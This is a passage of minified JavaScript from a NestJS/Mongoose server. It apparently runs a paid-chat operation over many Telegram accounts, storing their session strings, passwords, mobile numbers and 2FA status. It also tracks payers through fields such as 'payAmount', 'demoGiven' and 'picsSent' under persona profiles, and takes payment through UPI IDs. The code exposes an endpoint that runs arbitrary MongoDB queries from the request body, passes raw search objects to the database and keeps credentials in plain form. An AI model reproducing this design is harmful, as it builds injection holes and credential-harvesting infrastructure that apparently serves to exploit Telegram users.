n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.TransactionModule=void 0;const n=o(3563),r=o(5839),a=o(2630),s=o(8861),c=o(2763);let l=class{};t.TransactionModule=l,t.TransactionModule=l=i([(0,n.Module)({imports:[r.MongooseModule.forFeature([{name:c.Transaction.name,schema:c.TransactionSchema}])],controllers:[s.TransactionController],providers:[a.TransactionService],exports:[a.TransactionService]})],l)},2630:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.TransactionService=void 0;const a=o(3563),s=o(5839),c=o(6037),l=o(2763);let p=class{constructor(e){this.transactionModel=e}async create(e){const t=new this.transactionModel(e);return await t.save()}async findOne(e){const t=await this.transactionModel.findById(e).exec();if(!t)throw new a.NotFoundException("Transaction not found");return t}async findAll(e,t=10,o=0){const i=e?{$or:[{transactionId:{$regex:e,$options:"i"}},{issue:{$regex:e,$options:"i"}},{profile:{$regex:e,$options:"i"}},{chatId:{$regex:e,$options:"i"}}]}:{};return{transactions:await this.transactionModel.find(i).skip(o).limit(t).exec(),total:await this.transactionModel.countDocuments(i).exec()}}async update(e,t){const o=await this.transactionModel.findByIdAndUpdate(e,t,{new:!0}).exec();if(!o)throw new a.NotFoundException("Transaction not found");return o}async delete(e){const t=await this.transactionModel.findByIdAndDelete(e).exec();if(!t)throw new a.NotFoundException("Transaction not found");return t}};t.TransactionService=p,t.TransactionService=p=i([(0,a.Injectable)(),r(0,(0,s.InjectModel)(l.Transaction.name)),n("design:paramtypes",[c.Model])],p)},4890:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UpiIdController=void 0;const a=o(3563),s=o(9742),c=o(7579);let l=class{constructor(e){this.UpiIdService=e}async findOne(){return this.UpiIdService.findOne()}async update(e){return this.UpiIdService.update(e)}};t.UpiIdController=l,i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get Upi Ids"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],l.prototype,"findOne",null),i([(0,a.Patch)(),(0,s.ApiOperation)({summary:"Update Upi Ids"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[Object]),n("design:returntype",Promise)],l.prototype,"update",null),t.UpiIdController=l=i([(0,s.ApiTags)("UPI Ids"),(0,a.Controller)("upi-ids"),n("design:paramtypes",[c.UpiIdService])],l)},7106:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.UpiIdModule=void 0;const n=o(3563),r=o(5839),a=o(7579),s=o(4890),c=o(5793),l=o(889);let p=class{};t.UpiIdModule=p,t.UpiIdModule=p=i([(0,n.Global)(),(0,n.Module)({imports:[p,l.NpointModule,r.MongooseModule.forFeature([{name:"UpiIdModule",collection:"upi-ids",schema:c.UpiIdSchema}])],providers:[a.UpiIdService],controllers:[s.UpiIdController],exports:[a.UpiIdService]})],p)},5793:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.UpiIdSchema=t.UpiId=void 0;const n=o(5839),r=o(6037);let a=class{};t.UpiId=a,t.UpiId=a=i([(0,n.Schema)({versionKey:!1,autoIndex:!0,strict:!1,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],a),t.UpiIdSchema=n.SchemaFactory.createForClass(a),t.UpiIdSchema.add({type:r.default.Schema.Types.Mixed})},7579:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UpiIdService=void 0;const a=o(3563),s=o(5839),c=o(6037),l=o(8938),p=o(6185),d=o(6954);let u=class{constructor(e,t){this.UpiIdModel=e,this.npointSerive=t,this.upiIds={},this.UpiIdModel.findOne({}).exec().then((e=>{this.upiIds=e,console.log("Refreshed UPIs")})),setInterval((async()=>{await this.refreshUPIs(),await this.checkNpoint()}),3e5)}async OnModuleInit(){console.log("Config Module Inited")}async refreshUPIs(){console.log("Refreshed UPIs"),this.upiIds=await this.UpiIdModel.findOne({}).exec()}async checkNpoint(){const e=(await l.default.get("https://api.npoint.io/54baf762fd873c55c6b1")).data,t=await this.findOne();(0,p.areJsonsNotSame)(e,t)&&await this.npointSerive.updateDocument("54baf762fd873c55c6b1",this.upiIds)}async findOne(){if(Object.keys(this.upiIds).length>0)return this.upiIds;const e=await this.UpiIdModel.findOne({}).exec();return this.upiIds=e,console.log("Refreshed UPIs"),e}async update(e){delete e._id;const t=await this.UpiIdModel.findOneAndUpdate({},{$set:{...e}},{new:!0,upsert:!0}).exec();if(this.upiIds=t,console.log("Refreshed UPIs"),!t)throw new a.NotFoundException("UpiIdModel not found");return t}};t.UpiIdService=u,t.UpiIdService=u=i([(0,a.Injectable)(),r(0,(0,s.InjectModel)("UpiIdModule")),n("design:paramtypes",[c.Model,d.NpointService])],u)},2932:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateUserDataDto=void 0;const r=o(9742);class a{}t.CreateUserDataDto=a,i([(0,r.ApiProperty)({example:"5787751360",description:"Chat ID"}),n("design:type",String)],a.prototype,"chatId",void 0),i([(0,r.ApiProperty)({example:1,description:"Total count"}),n("design:type",Number)],a.prototype,"totalCount",void 0),i([(0,r.ApiProperty)({example:0,description:"Picture count"}),n("design:type",Number)],a.prototype,"picCount",void 0),i([(0,r.ApiProperty)({example:1718802722566,description:"Last message timestamp"}),n("design:type",Number)],a.prototype,"lastMsgTimeStamp",void 0),i([(0,r.ApiProperty)({example:1718802742567,description:"Limit time"}),n("design:type",Number)],a.prototype,"limitTime",void 0),i([(0,r.ApiProperty)({example:0,description:"Paid count"}),n("design:type",Number)],a.prototype,"paidCount",void 0),i([(0,r.ApiProperty)({example:0,description:"Profile count"}),n("design:type",Number)],a.prototype,"prfCount",void 0),i([(0,r.ApiProperty)({example:1,description:"Can reply"}),n("design:type",Number)],a.prototype,"canReply",void 0),i([(0,r.ApiProperty)({example:0,description:"Pay amount"}),n("design:type",Number)],a.prototype,"payAmount",void 0),i([(0,r.ApiProperty)({example:0,description:"highestPayAmount"}),n("design:type",Number)],a.prototype,"highestPayAmount",void 0),i([(0,r.ApiProperty)({example:0,description:"cheatCount",default:0}),n("design:type",Number)],a.prototype,"cheatCount",void 0),i([(0,r.ApiProperty)({example:0,description:"callTime",default:0}),n("design:type",Number)],a.prototype,"callTime",void 0),i([(0,r.ApiProperty)({example:"بـِـعٰ۬ێډ الۿٰٕقاوٰ۬ێ ٴ🦅",description:"Username"}),n("design:type",String)],a.prototype,"username",void 0),i([(0,r.ApiProperty)({example:"-7250939091939055173",description:"Access hash"}),n("design:type",String)],a.prototype,"accessHash",void 0),i([(0,r.ApiProperty)({example:!0,description:"Paid reply status"}),n("design:type",Boolean)],a.prototype,"paidReply",void 0),i([(0,r.ApiProperty)({example:!1,description:"Demo given status"}),n("design:type",Boolean)],a.prototype,"demoGiven",void 0),i([(0,r.ApiProperty)({example:!1,description:"Second show status"}),n("design:type",Boolean)],a.prototype,"secondShow",void 0),i([(0,r.ApiProperty)({example:"sneha",description:"Profile name"}),n("design:type",String)],a.prototype,"profile",void 0),i([(0,r.ApiProperty)({example:!1,description:"Pics Sent status"}),n("design:type",Boolean)],a.prototype,"picsSent",void 0),i([(0,r.ApiProperty)({example:[],description:"videos"}),n("design:type",Array)],a.prototype,"videos",void 0)},2256:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchDto=void 0;const r=o(9742),a=o(4922);class s{}t.SearchDto=s,i([(0,r.ApiPropertyOptional)({description:"Total count",type:Number}),n("design:type",Number)],s.prototype,"totalCount",void 0),i([(0,r.ApiPropertyOptional)({description:"Picture count",type:Number}),n("design:type",Number)],s.prototype,"picCount",void 0),i([(0,r.ApiPropertyOptional)({description:"Last message timestamp",type:Number}),n("design:type",Number)],s.prototype,"lastMsgTimeStamp",void 0),i([(0,r.ApiPropertyOptional)({description:"Limit time",type:Number}),n("design:type",Number)],s.prototype,"limitTime",void 0),i([(0,r.ApiPropertyOptional)({description:"Paid count",type:Number}),n("design:type",Number)],s.prototype,"paidCount",void 0),i([(0,r.ApiPropertyOptional)({description:"Profile count",type:Number}),n("design:type",Number)],s.prototype,"prfCount",void 0),i([(0,r.ApiPropertyOptional)({description:"Can reply",type:Number}),n("design:type",Number)],s.prototype,"canReply",void 0),i([(0,r.ApiPropertyOptional)({description:"Pay amount",type:Number}),n("design:type",Number)],s.prototype,"payAmount",void 0),i([(0,r.ApiPropertyOptional)({description:"Username"}),n("design:type",String)],s.prototype,"username",void 0),i([(0,r.ApiPropertyOptional)({description:"Access hash"}),n("design:type",String)],s.prototype,"accessHash",void 0),i([(0,r.ApiPropertyOptional)({description:"Paid reply status",type:Boolean}),n("design:type",Boolean)],s.prototype,"paidReply",void 0),i([(0,r.ApiPropertyOptional)({description:"Demo given status",type:Boolean}),n("design:type",Boolean)],s.prototype,"demoGiven",void 0),i([(0,r.ApiPropertyOptional)({description:"Second show status",type:Boolean}),n("design:type",Boolean)],s.prototype,"secondShow",void 0),i([(0,r.ApiPropertyOptional)({description:"Profile name"}),(0,a.Transform)((({value:e})=>e?.trim().toLowerCase())),n("design:type",String)],s.prototype,"profile",void 0),i([(0,r.ApiPropertyOptional)({description:"Chat ID"}),n("design:type",String)],s.prototype,"chatId",void 0),i([(0,r.ApiPropertyOptional)({description:"Pics Sent status"}),n("design:type",Boolean)],s.prototype,"picsSent",void 0)},4241:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateUserDataDto=void 0;const i=o(9742),n=o(2932);class r extends((0,i.PartialType)(n.CreateUserDataDto)){}t.UpdateUserDataDto=r},3664:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.UserDataSchema=t.UserData=void 0;const r=o(5839);let a=class{};t.UserData=a,i([(0,r.Prop)({required:!0}),n("design:type",String)],a.prototype,"chatId",void 0),i([(0,r.Prop)({required:!0}),n("design:type",Number)],a.prototype,"totalCount",void 0),i([(0,r.Prop)({required:!0}),n("design:type",Number)],a.prototype,"picCount",void 0),i([(0,r.Prop)({required:!0}),n("design:type",Number)],a.prototype,"lastMsgTimeStamp",void 0),i([(0,r.Prop)({required:!0}),n("design:type",Number)],a.prototype,"limitTime",void 0),i([(0,r.Prop)({required:!0}),n("design:type",Number)],a.prototype,"paidCount",void 0),i([(0,r.Prop)({required:!0}),n("design:type",Number)],a.prototype,"prfCount",void 0),i([(0,r.Prop)({required:!0}),n("design:type",Number)],a.prototype,"canReply",void 0),i([(0,r.Prop)({required:!0}),n("design:type",Number)],a.prototype,"payAmount",void 0),i([(0,r.Prop)({required:!0}),n("design:type",String)],a.prototype,"username",void 0),i([(0,r.Prop)({required:!0}),n("design:type",String)],a.prototype,"accessHash",void 0),i([(0,r.Prop)({required:!0}),n("design:type",Boolean)],a.prototype,"paidReply",void 0),i([(0,r.Prop)({required:!0}),n("design:type",Boolean)],a.prototype,"demoGiven",void 0),i([(0,r.Prop)({required:!0}),n("design:type",Boolean)],a.prototype,"secondShow",void 0),i([(0,r.Prop)({required:!0,default:0}),n("design:type",Number)],a.prototype,"fullShow",void 0),i([(0,r.Prop)({required:!0}),n("design:type",String)],a.prototype,"profile",void 0),i([(0,r.Prop)({required:!0}),n("design:type",Boolean)],a.prototype,"picSent",void 0),i([(0,r.Prop)({required:!0}),n("design:type",Number)],a.prototype,"highestPayAmount",void 0),i([(0,r.Prop)({required:!0}),n("design:type",Number)],a.prototype,"cheatCount",void 0),i([(0,r.Prop)({required:!0}),n("design:type",Number)],a.prototype,"callTime",void 0),i([(0,r.Prop)({required:!1,default:[]}),n("design:type",Array)],a.prototype,"videos",void 0),t.UserData=a=i([(0,r.Schema)({collection:"userData",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],a),t.UserDataSchema=r.SchemaFactory.createForClass(a)},430:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UserDataController=void 0;const a=o(3563),s=o(9742),c=o(3559),l=o(2932),p=o(2256),d=o(4241);let u=class{constructor(e){this.userDataService=e}async create(e){return this.userDataService.create(e)}async search(e){return this.userDataService.search(e)}async findAll(){return this.userDataService.findAll()}async updateAll(e,t){return this.userDataService.updateAll(e,t)}async findOne(e,t){return this.userDataService.findOne(e,t)}async update(e,t,o){return this.userDataService.update(e,t,o)}async remove(e,t){return this.userDataService.remove(e,t)}clearCount(e){return this.userDataService.clearCount(e)}async executeQuery(e){try{const{query:t,sort:o,limit:i,skip:n}=e;return await this.userDataService.executeQuery(t,o,i,n)}catch(e){throw e}}};t.UserDataController=u,i([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create user data"}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[l.CreateUserDataDto]),n("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Get)("search"),(0,s.ApiOperation)({summary:"Search user data"}),r(0,(0,a.Query)()),n("design:type",Function),n("design:paramtypes",[p.SearchDto]),n("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all user data"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Patch)("updateAll/:chatId"),(0,s.ApiOperation)({summary:"Update user data by ID"}),r(0,(0,a.Param)("chatId")),r(1,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,d.UpdateUserDataDto]),n("design:returntype",Promise)],u.prototype,"updateAll",null),i([(0,a.Get)(":profile/:chatId"),(0,s.ApiOperation)({summary:"Get user data by ID"}),r(0,(0,a.Param)("profile")),r(1,(0,a.Param)("chatId")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Patch)(":profile/:chatId"),(0,s.ApiOperation)({summary:"Update user data by ID"}),r(0,(0,a.Param)("profile")),r(1,(0,a.Param)("chatId")),r(2,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,String,d.UpdateUserDataDto]),n("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Delete)(":profile/:chatId"),(0,s.ApiOperation)({summary:"Delete user data by ID"}),r(0,(0,a.Param)("profile")),r(1,(0,a.Param)("chatId")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],u.prototype,"remove",null),i([(0,a.Get)("clear-count"),r(0,(0,a.Query)("chatId")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",void 0)],u.prototype,"clearCount",null),i([(0,a.Post)("query"),(0,s.ApiOperation)({summary:"Execute a custom MongoDB query"}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[Object]),n("design:returntype",Promise)],u.prototype,"executeQuery",null),t.UserDataController=u=i([(0,s.ApiTags)("UserData of TG clients"),(0,a.Controller)("userData"),n("design:paramtypes",[c.UserDataService])],u)},6158:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.UserDataModule=void 0;const n=o(3563),r=o(5839),a=o(3664),s=o(3559),c=o(430),l=o(5774);let p=class{};t.UserDataModule=p,t.UserDataModule=p=i([(0,n.Module)({imports:[l.initModule,r.MongooseModule.forFeature([{name:a.UserData.name,schema:a.UserDataSchema,collection:"userData"}])],controllers:[c.UserDataController],providers:[s.UserDataService],exports:[s.UserDataService]})],p)},3559:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UserDataService=void 0;const a=o(3563),s=o(5839),c=o(6037),l=o(3664),p=o(6185);let d=class{constructor(e){this.userDataModel=e,this.callCounts=new Map}async create(e){return new this.userDataModel(e).save()}async findAll(){return await this.userDataModel.find().exec()}async findOne(e,t){const o=(await this.userDataModel.findOne({profile:e,chatId:t}).exec())?.toJSON();o||console.warn(`UserData with ID "${e} - ${t}" not found`);const i=this.callCounts.get(t)||0;return this.callCounts.set(t,i+1),o?{...o,count:this.callCounts.get(t)}:void 0}clearCount(e){return e?(this.callCounts.delete(e),`Count cleared for chatId: ${e}`):(this.callCounts.clear(),"All counts cleared.")}async update(e,t,o){delete o._id,console.log(o);const i=await this.userDataModel.findOneAndUpdate({profile:e,chatId:t},{$set:o},{new:!0,upsert:!0}).exec();return i||console.warn(`UserData with ID "${t}" not found`),i}async updateAll(e,t){delete t._id;const o=await this.userDataModel.updateMany({chatId:e},{$set:t},{new:!0,upsert:!0}).exec();return o||console.warn(`UserData with ID "${e}" not found`),o}async remove(e,t){const o=await this.userDataModel.findOneAndDelete({profile:e,chatId:t}).exec();return o||console.warn(`UserData with ID "${t}" not found`),o}async search(e){return console.log(e),e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),console.log(e),this.userDataModel.find(e).exec()}async executeQuery(e,t,o,i){try{if(!e)throw new a.BadRequestException("Query is invalid.");const n=this.userDataModel.find(e);return t&&n.sort(t),o&&n.limit(o),i&&n.skip(i),await n.exec()}catch(e){throw new a.InternalServerErrorException(e.message)}}async resetPaidUsers(){try{await this.userDataModel.updateMany({$and:[{payAmount:{$gt:10},totalCount:{$gt:30}}]},{$set:{totalCount:10,limitTime:Date.now(),paidReply:!0}})}catch(e){(0,p.parseError)(e)}}};t.UserDataService=d,t.UserDataService=d=i([(0,a.Injectable)(),r(0,(0,s.InjectModel)(l.UserData.name)),n("design:paramtypes",[c.Model])],d)},9631:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateUserDto=void 0;const r=o(9742);class a{constructor(){this.twoFA=!1,this.expired=!1,this.password=null,this.movieCount=0,this.photoCount=0,this.videoCount=0,this.otherPhotoCount=0,this.otherVideoCount=0,this.ownPhotoCount=0,this.ownVideoCount=0,this.contacts=0}}t.CreateUserDto=a,i([(0,r.ApiProperty)({description:"Mobile number of the user",example:"917330803480"}),n("design:type",String)],a.prototype,"mobile",void 0),i([(0,r.ApiProperty)({description:"Session information of the user",example:"string"}),n("design:type",String)],a.prototype,"session",void 0),i([(0,r.ApiProperty)({description:"First name of the user",example:"Praveen"}),n("design:type",String)],a.prototype,"firstName",void 0),i([(0,r.ApiProperty)({description:"Last name of the user",example:null}),n("design:type",String)],a.prototype,"lastName",void 0),i([(0,r.ApiProperty)({description:"Username of the user",example:null}),n("design:type",String)],a.prototype,"username",void 0),i([(0,r.ApiProperty)({description:"Number of channels",example:56}),n("design:type",Number)],a.prototype,"channels",void 0),i([(0,r.ApiProperty)({description:"Number of personal chats",example:74}),n("design:type",Number)],a.prototype,"personalChats",void 0),i([(0,r.ApiProperty)({description:"Number of messages",example:0}),n("design:type",Number)],a.prototype,"msgs",void 0),i([(0,r.ApiProperty)({description:"Total number of chats",example:195}),n("design:type",Number)],a.prototype,"totalChats",void 0),i([(0,r.ApiProperty)({description:"Timestamp of last active",example:"2024-06-03"}),n("design:type",String)],a.prototype,"lastActive",void 0),i([(0,r.ApiProperty)({description:"Telegram ID of the user",example:"2022068676"}),n("design:type",String)],a.prototype,"tgId",void 0),i([(0,r.ApiProperty)({description:"TwoFA status",example:!1}),n("design:type",Boolean)],a.prototype,"twoFA",void 0),i([(0,r.ApiProperty)({description:"Expiration status",example:!1}),n("design:type",Boolean)],a.prototype,"expired",void 0),i([(0,r.ApiProperty)({description:"password",example:"pass"}),n("design:type",String)],a.prototype,"password",void 0),i([(0,r.ApiProperty)({description:"Number of movies",example:0}),n("design:type",Number)],a.prototype,"movieCount",void 0),i([(0,r.ApiProperty)({description:"Number of photos",example:0}),n("design:type",Number)],a.prototype,"photoCount",void 0),i([(0,r.ApiProperty)({description:"Number of videos",example:0}),n("design:type",Number)],a.prototype,"videoCount",void 0),i([(0,r.ApiProperty)({description:"Gender of the user",example:null}),n("design:type",String)],a.prototype,"gender",void 0),i([(0,r.ApiProperty)({description:"Number of other photos",example:0}),n("design:type",Number)],a.prototype,"otherPhotoCount",void 0),i([(0,r.ApiProperty)({description:"Number of other videos",example:0}),n("design:type",Number)],a.prototype,"otherVideoCount",void 0),i([(0,r.ApiProperty)({description:"Number of own photos",example:0}),n("design:type",Number)],a.prototype,"ownPhotoCount",void 0),i([(0,r.ApiProperty)({description:"Number of own videos",example:0}),n("design:type",Number)],a.prototype,"ownVideoCount",void 0),i([(0,r.ApiProperty)({description:"Number of contacts",example:105}),n("design:type",Number)],a.prototype,"contacts",void 0),i([(0,r.ApiProperty)({description:"Call details of the user",example:{outgoing:1,incoming:0,video:1,chatCallCounts:[],totalCalls:1}}),n("design:type",Object)],a.prototype,"calls",void 0),i([(0,r.ApiPropertyOptional)({description:"Call details of the user",example:[]}),n("design:type",Array)],a.prototype,"recentUsers",void 0)},9879:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchUserDto=void 0;const r=o(9742),a=o(4922),s=o(7403);class c{}t.SearchUserDto=c,i([(0,r.ApiPropertyOptional)({description:"Filter by Telegram ID"}),(0,s.IsOptional)(),(0,s.IsString)(),n("design:type",String)],c.prototype,"tgId",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by mobile number"}),(0,s.IsOptional)(),(0,s.IsString)(),n("design:type",String)],c.prototype,"mobile",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by twoFA status",type:Boolean}),(0,s.IsOptional)(),(0,s.IsBoolean)(),n("design:type",Boolean)],c.prototype,"twoFA",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by Expiration status",type:Boolean}),(0,s.IsOptional)(),(0,s.IsBoolean)(),n("design:type",Boolean)],c.prototype,"expired",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by session"}),(0,s.IsOptional)(),(0,s.IsString)(),n("design:type",String)],c.prototype,"session",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by first name"}),(0,s.IsOptional)(),(0,s.IsString)(),n("design:type",String)],c.prototype,"firstName",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by last name"}),(0,s.IsOptional)(),(0,s.IsString)(),n("design:type",String)],c.prototype,"lastName",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by username"}),(0,s.IsOptional)(),(0,s.IsString)(),n("design:type",String)],c.prototype,"username",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by channels count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),n("design:type",Number)],c.prototype,"channels",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by personal chats count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),n("design:type",Number)],c.prototype,"personalChats",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by demo given 